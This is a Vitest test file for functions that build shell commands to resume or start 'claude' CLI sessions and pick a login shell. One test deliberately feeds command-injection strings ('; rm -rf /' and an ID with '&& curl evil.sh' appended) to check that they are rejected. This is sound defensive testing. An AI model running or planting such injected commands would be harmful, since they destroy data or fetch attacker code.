import { describe, it, expect } from 'vitest'
import { buildResumeCommand, buildNewSessionCommand, loginShell } from '../../src/main/pty/resumeCommand'

const ID = 'c8af2f41-ff45-41cc-8d23-0f71067c7865'

describe('buildResumeCommand', () => {
  it('execs claude with the session id', () => {
    expect(buildResumeCommand(ID)).toBe(`exec claude --resume ${ID}`)
  })

  it('adds --fork-session when forking', () => {
    expect(buildResumeCommand(ID, { fork: true })).toBe(`exec claude --resume ${ID} --fork-session`)
  })

  it('quotes an explicit binary path', () => {
    expect(buildResumeCommand(ID, { claudeBin: '/opt/my apps/claude' }))
      .toBe(`exec '/opt/my apps/claude' --resume ${ID}`)
  })

  it('rejects anything that is not a UUID', () => {
    expect(() => buildResumeCommand('; rm -rf /')).toThrow(/invalid session id/i)
    expect(() => buildResumeCommand('')).toThrow(/invalid session id/i)
    expect(() => buildResumeCommand(`${ID} && curl evil.sh`)).toThrow(/invalid session id/i)
  })
})

describe('buildNewSessionCommand', () => {
  it('execs claude with no --resume flag', () => {
    expect(buildNewSessionCommand()).toBe('exec claude')
  })

  it('quotes an explicit binary path, the same as buildResumeCommand', () => {
    expect(buildNewSessionCommand({ claudeBin: '/opt/my apps/claude' }))
      .toBe(`exec '/opt/my apps/claude'`)
  })
})

describe('loginShell', () => {
  it('prefers $SHELL', () => {
    expect(loginShell({ SHELL: '/usr/bin/zsh' })).toBe('/usr/bin/zsh')
  })

  it('falls back to bash', () => {
    expect(loginShell({})).toBe('/bin/bash')
  })
})
